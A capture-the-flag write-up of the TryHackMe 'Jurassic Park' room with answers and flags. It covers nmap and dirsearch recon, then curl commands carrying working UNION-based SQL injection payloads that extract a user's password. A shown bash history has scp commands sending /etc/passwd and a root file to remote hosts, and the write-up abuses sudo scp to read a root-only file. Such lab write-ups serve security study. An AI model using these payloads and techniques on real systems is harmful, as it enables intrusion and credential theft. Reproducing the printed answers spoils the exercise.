# Jurassic Park

A Jurassic Park CTF

[Jurassic Park](https://tryhackme.com/room/jurassicpark)

## Topic's

- Network Enumeration
- Web Enermeration
- Bash SCripting (Fuzzing)
- SQL Enumeration
- SQL Injection
- Linux Enumeration
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Jurassic Park CTF

This medium-hard task will require you to enumerate the web application, get credentials to the server and find 5 flags hidden around the file system. Oh, Dennis Nedry has helped us to secure the app too...

You're also going to want to turn up your devices volume (firefox is recommended). So, deploy the VM and get hacking..

Please [connect to our network](https://tryhackme.com/access) before deploying the machine.

```
kali@kali:~/CTFs/tryhackme/Jurassic Park$ sudo nmap -A -sS -sC -sV -O 10.10.91.74
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 23:06 CEST
Nmap scan report for 10.10.91.74
Host is up (0.041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 7f:fe:18:f9:72:4d:dd:92:2c:c2:59:a0:e3:3f:cb:25 (RSA)
|   256 fa:cc:f8:38:81:1d:26:60:7e:1c:db:bf:ce:2d:cb:12 (ECDSA)
|_  256 9c:ff:d2:76:ee:ce:70:85:4a:24:7b:17:f0:db:f4:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jarassic Park
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=32014%PV=Y%DS=2%DC=T%G=Y%TM=5F8CAE
OS:6C%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   36.36 ms 10.8.0.1
2   37.03 ms 10.10.91.74

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.64 seconds
```

```
kali@kali:~/CTFs/tryhackme/Jurassic Park$ sudo /opt/dirsearch/dirsearch.py -u http://jurassic.park -e php -x 404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php | HTTP method: GET | Threads: 20 | Wordlist size: 207628

Error Log: /opt/dirsearch/logs/errors-20-10-18_23-08-47.log

Target: http://jurassic.park

Output File: /opt/dirsearch/reports/jurassic.park/_20-10-18_23-08-48.txt

[23:08:48] Starting:
[23:08:50] 301 -  315B  - /assets  ->  http://jurassic.park/assets/
[23:09:04] 200 -   65B  - /delete
[23:12:47] 403 -  301B  - /server-status
CTRL+C detected: Pausing threads, please wait...
[e]xit / [c]ontinue: e

Canceled by the user
```

```
kali@kali:~/CTFs/tryhackme/Jurassic Park$ for i in {1..25}; do echo -e "id=$i\n\n" && curl -s http://jurassic.park/item.php?id=$i | grep -A 10 '<body>' && echo -e '\n------------------------------------------------\n'; done
id=1


<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Gold Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $500000</h3></br>
    <div class="alert alert-primary" role="alert"><b>4</b> of these packages have been sold in the last hour.</div></br>
    <h4>Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunch, tour around the park AND a FREE dinosaur egg from a dino of your choice!</h4>
    </br><h4>Order yours quick by calling us!</h4>


------------------------------------------------

id=2


<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Bronse Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $250000</h3></br>
    <div class="alert alert-primary" role="alert"><b>11</b> of these packages have been sold in the last hour.</div></br>
    <h4>Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a dinosaur lunch! Try different dino's and rate the best tasting one!</h4>
    </br><h4>Order yours quick by calling us!</h4>


------------------------------------------------

id=3


<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Basic Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $100000</h3></br>
    <div class="alert alert-primary" role="alert"><b>27</b> of these packages have been sold in the last hour.</div></br>
    <h4>Children under 5 can attend for free and eat free. This package will include a basic tour around the park in the brand new automated cars!</h4>
    </br><h4>Order yours quick by calling us!</h4>


------------------------------------------------

id=4


id=5


<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Development Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $0</h3></br>
    <div class="alert alert-primary" role="alert"><b>0</b> of these packages have been sold in the last hour.</div></br>
    <h4>Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?</h4>
    </br><h4>Order yours quick by calling us!</h4>


------------------------------------------------
```

```
<body>
  <section class='black text-center'>
    <a href="/index.php"><img width=300px src="assets/Jurassic-Park-Logo.png"></a></br></br>
    <h1>Development Package</h1></br>
  </section>
  <div class="container text-center">
    <h3>Price: $0</h3></br>
    <div class="alert alert-primary" role="alert"><b>0</b> of these packages have been sold in the last hour.</div></br>
    <h4>Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?</h4>
    </br><h4>Order yours quick by calling us!</h4>
```

1. What is the SQL database called which is serving the shop information?

```
kali@kali:~/CTFs/tryhackme/Jurassic Park$ curl -s "http://jurassic.park/item.php?id=5%20UNION%20SELECT%201,database(),3,4,5" | \grep '<h1>' | cut -d '>' -f2 | cut -d '<' -f 1
park Package
```

`park`

2. How many columns does the table have?

`5`

3. Whats the system version?

```
kali@kali:~/CTFs/tryhackme/Jurassic Park$ curl -s "http://jurassic.park/item.php?id=5%20UNION%20SELECT%201,version(),3,4,5" | \grep '<h1>' | cut -d '>' -f2 | cut -d '<' -f 1
5.7.25-0ubuntu0.16.04.2 Package
```

`Ubuntu 16.04`

4. What is dennis' password?

```
kali@kali:~/CTFs/tryhackme/Jurassic Park$ curl -s "http://jurassic.park/item.php?id=5%20UNION%20SELECT%201,password,3,4,5%20from%20users" | \grep '<h1>' | cut -d '>' -f2 | cut -d '<' -f 1
ih8dinos Package
```

`ih8dinos`

5. Locate and get the first flag contents.

```
dennis@ip-10-10-91-74:~$ ls
flag1.txt  test.sh
dennis@ip-10-10-91-74:~$ cat flag1.txt
Congrats on finding the first flag.. But what about the rest? :O

b89f2d69c56b9981ac92dd267f
```

`b89f2d69c56b9981ac92dd267f`

6. Whats the contents of the second flag?

```
dennis@ip-10-10-91-74:~$ find / -iname "flag*" -type f 2>/dev/null
/home/dennis/flag1.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/vif-0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/usr/src/linux-aws-headers-4.4.0-1072/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-4.4.0-1072-aws/include/config/zone/dma/flag.h
/boot/grub/fonts/flagTwo.txt
dennis@ip-10-10-91-74:~$ cat /boot/grub/fonts/flagTwo.txt
96ccd6b429be8c9a4b501c7a0b117b0a
```

`96ccd6b429be8c9a4b501c7a0b117b0a`

7. Whats the contents of the third flag?

```
dennis@ip-10-10-91-74:~$ cat .bash_history
Flag3:b4973bbc9053807856ec815db25fb3f1
sudo -l
sudo scp
scp
sudo find
ls
vim test.sh
ls
cd ~
ls
vim test.sh
ls
ls -la
sudo scp -S test.sh
sudo scp /etc/password
sudo scp /etc/password localhost@10.8.0.6@~/
sudo scp /etc/passwd localhost@10.8.0.6@~/
sudo scp /etc/passwd dennis@10.0.0.59@~/
sudo scp /etc/passwd dennis@10.0.0.59:~/
sudo scp /etc/passwd dennis@10.0.0.59:/home/dennis
sudo scp /etc/passwd ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/ -v
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
sudo scp -v /root/flag5.txt ben@localhost:~/
sudo scp -v /root/flag5.txt dennis@localhost:~/
sudo scp -v /root/flag5.txt dennis@10.0.0.59:~/
sudo scp -v /root/flag5.txt ben@10.8.0.6:~/
ping 10.8.0.6
ping 10.8.0.7
sudo scp /root/flag5.txt ben@10.8.0.6:~/
sudo scp /root/flag5.txt ben@88.104.10.206:~/
sudo scp -v /root/flag5.txt ben@88.104.10.206:~/
sudo scp /root/flag5.txt ben@10.8.0.6:~/
ls
vim ~/.bash_history
```

`Flag3:b4973bbc9053807856ec815db25fb3f1`

8. There is no fourth flag.

```
dennis@ip-10-10-91-74:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:x
:q!
:w
:x!

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:
""1     LINE    0
        ls
"2      LINE    0
        vim flagFour.txt
"3      LINE    0
        ls -la
"4      LINE    0
        ls
"5      LINE    0
        cd /tmp/
"6      LINE    0
        ls
"7      LINE    0
        uname -a
"8      LINE    0
        ls -la
"9      LINE    0
        vim flag1.txt

# File marks:
'0  1  37  ~/.bash_history
'1  2  18  ~/test.sh
'2  2  18  /home/ubuntu/test.sh
'3  1802  31  /tmp/flagFour.txt
'4  1  63  ~/flag1.txt
'5  1  31  /boot/grub/fonts/flagTwo.txt
'6  1  0  /var/www/html/index.php

# Jumplist (newest first):
-'  1  37  ~/.bash_history
-'  2  18  ~/test.sh
-'  1  0  ~/test.sh
-'  2  18  /home/ubuntu/test.sh
-'  1  0  /home/ubuntu/test.sh
-'  1802  31  /tmp/flagFour.txt
-'  1  0  /tmp/flagFour.txt
-'  1  63  ~/flag1.txt
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  63  ~/flag1.txt
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1802  31  /tmp/flagFour.txt
-'  1  0  /tmp/flagFour.txt
-'  1  63  ~/flag1.txt
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  63  ~/flag1.txt
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  0  /var/www/html/index.php
-'  1  31  /boot/grub/fonts/flagTwo.txt
-'  1  0  /var/www/html/index.php

# History of marks within files (newest to oldest):

> ~/.bash_history
        "       1       37
        ^       1       38
        .       1       20
        +       1       0
        +       1       20

> ~/test.sh
        "       2       18
        ^       2       19
        .       2       18
        +       2       18

> /home/ubuntu/test.sh
        "       2       18
        ^       2       19
        .       2       18
        +       2       18

> /tmp/flagFour.txt
        "       1802    31
        ^       1802    32
        .       1806    32
        +       3195    0
        +       3195    0
        +       1806    32

> ~/flag1.txt
        "       1       63
        ^       1       64
        .       1       63
        +       1       63

> /boot/grub/fonts/flagTwo.txt
        "       1       31
        ^       1       32
        .       1       31
        +       1       31

> /var/www/html/index.php
        "       1       0
```

`No answer needed`

9.  Whats the contents of the fifth flag?

```
dennis@ip-10-10-91-74:~$ sudo -l
Matching Defaults entries for dennis on ip-10-10-91-74.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dennis may run the following commands on ip-10-10-91-74.eu-west-1.compute.internal:
    (ALL) NOPASSWD: /usr/bin/scp
dennis@ip-10-10-91-74:~$ cat test.sh
#!/bin/bash
cat /root/flag5.txt
dennis@ip-10-10-91-74:~$ sudo scp -r /root/flag5.txt /tmp
dennis@ip-10-10-91-74:~$ ls -lah /tmp
total 36K
drwxrwxrwt  8 root root 4.0K Oct 18 21:21 .
drwxr-xr-x 23 root root 4.0K Oct 18 21:05 ..
-rw-r--r--  1 root root   33 Oct 18 21:21 flag5.txt
drwxrwxrwt  2 root root 4.0K Oct 18 21:05 .font-unix
drwxrwxrwt  2 root root 4.0K Oct 18 21:05 .ICE-unix
drwx------  3 root root 4.0K Oct 18 21:05 systemd-private-f149895bba4846fa86e7870e7eaad71e-systemd-timesyncd.service-BQvjdV
drwxrwxrwt  2 root root 4.0K Oct 18 21:05 .Test-unix
drwxrwxrwt  2 root root 4.0K Oct 18 21:05 .X11-unix
drwxrwxrwt  2 root root 4.0K Oct 18 21:05 .XIM-unix
dennis@ip-10-10-91-74:~$ cat /tmp/flag5.txt
2a7074e491fcacc7eeba97808dc5e2ec
```

`2a7074e491fcacc7eeba97808dc5e2ec`
